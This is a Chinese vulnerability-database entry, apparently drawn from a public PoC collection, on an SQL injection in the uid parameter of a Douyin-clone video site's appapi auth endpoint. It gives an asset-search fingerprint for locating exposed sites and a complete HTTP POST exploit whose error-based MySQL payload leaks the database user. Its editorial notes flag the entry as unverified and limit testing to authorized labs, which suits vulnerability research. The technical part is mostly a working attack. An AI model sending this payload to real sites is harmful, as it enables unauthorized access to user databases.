---
source: "wy876 漏洞文库"
title: "仿抖音/仿9短视频网站源码（发行方未知） appapi auth success uid SQL注入"
product: "仿抖音/仿9短视频网站源码（发行方未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL旧式RAND报错条件，版本未知"
prerequisites: "前台请求无Cookie"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/uml4ee1m5cxyvkfo"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BB%BF%E6%8A%96%E9%9F%B3%E7%9F%AD%E8%A7%86%E9%A2%91%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F/%E4%BB%BF%E6%8A%96%E9%9F%B3%E7%9F%AD%E8%A7%86%E9%A2%91%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9Findex%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-9cc0e15a2765a468f7aa5a1f"
entity_id: "ve-9cc0e15a2765a468f7aa5a1f"
schema_version: "1"
---

# 仿抖音/仿9短视频网站源码（发行方未知） appapi auth success uid SQL注入

## 条目说明

- 对象与具体问题：仿抖音/仿9短视频网站源码（发行方未知）；appapi auth success uid SQL注入
- 版本、配置及部署条件：MySQL旧式RAND报错条件，版本未知
- 认证与权限前提：前台请求无Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 这是仿站源码不是抖音官方产品，应明确发行方/仓库commit避免错误厂商归因
- Content-Type application/x-www-form-urlencode漏d，可能影响POST解析
- 只有USER报错载荷无响应，auth success接口可能改认证状态需核副作用
- 缺修复/来源编号/代码，指纹引擎未标

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
抖音视频APP/仿9视频APP/短视频功能/原生双端开发，除了直播没有开通，其他功能都是精仿，非会员不能评论，发布视频需要注册，功能模块很多，支付模式微信，支付宝，卡密，用户自己上传带赏金，点赞，关注，留言等功能。仿抖音短视频网站系统index存在前台SQL注入漏洞

## 二、影响版本
+ 仿抖音短视频网站系统

## 三、资产测绘
```plain
"/public/index/images/new_logo.png"
```


## 四、漏洞复现
```http
POST /index.php?g=appapi&m=auth&a=success HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencode
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

uid=(SELECT 7052 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uml4ee1m5cxyvkfo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
